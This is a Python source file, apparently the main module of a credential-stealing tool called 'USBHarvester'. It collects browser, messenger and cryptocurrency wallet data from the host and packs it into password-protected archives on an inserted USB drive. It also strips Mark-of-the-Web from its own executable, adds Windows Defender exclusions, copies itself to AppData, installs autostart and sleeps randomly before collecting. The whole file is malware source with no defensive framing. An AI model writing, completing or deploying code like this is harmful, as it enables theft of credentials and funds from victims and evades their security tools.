import sys
import time
import threading
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent))

from core.logger import logger
from core import usb, system, packer
from grab import browsers, messengers, wallets
from persist import autostart, watcher, stealth

DUMP_ROOT = "USBHarvester_Dump"


def collect_system() -> dict:
    return system.collect()


def collect_all(dump_dir: Path, password: str) -> Path:
    dump_dir.mkdir(parents=True, exist_ok=True)
    sysinfo = collect_system()
    system.write_report(dump_dir / "system.txt", sysinfo)

    for name, fn in [
        ("browsers", browsers.collect),
        ("messengers", messengers.collect),
        ("wallets", wallets.collect),
    ]:
        logger.info(f"collecting {name}")
        try:
            fn(dump_dir / name)
        except Exception as e:
            logger.error(f"{name} failed: {e}")

    return packer.pack(dump_dir, password=password)


def harvest_on_usb(usb_path: Path) -> None:
    host = system.hostname()
    stamp = time.strftime("%Y%m%d_%H%M%S")
    dump_dir = usb_path / f"{DUMP_ROOT}_{host}_{stamp}"
    password = f"u{stamp}h"
    try:
        archive = collect_all(dump_dir, password)
        logger.info(f"archive: {archive} | pass: {password}")
    except Exception as e:
        logger.error(f"harvest failed: {e}")


def main() -> int:
    logger.info("=== started ===")

    # stealth: strip motw from self, copy to appdata
    stealth.strip_motw(Path(sys.executable) if getattr(sys, "frozen", False) else Path(sys.argv[0]).resolve())

    # defender exclusions (requires admin, silently skips if not)
    stealth.add_defender_exclusions()

    # self-copy to appdata (clean location, no uac)
    new_exe = stealth.self_copy()

    # install autostart pointing to the copied exe (if differs)
    try:
        autostart.install()
    except Exception as e:
        logger.error(f"autostart failed: {e}")

    # jitter sleep before any collection
    stealth.sleep_jitter(30, 90)

    # start usb watcher
    t = threading.Thread(target=watcher.watch, daemon=True)
    t.start()

    # harvest if usb already present
    drives = usb.list_removable()
    if drives:
        harvest_on_usb(drives[0])

    while True:
        time.sleep(60)


if __name__ == "__main__":
    sys.exit(main())
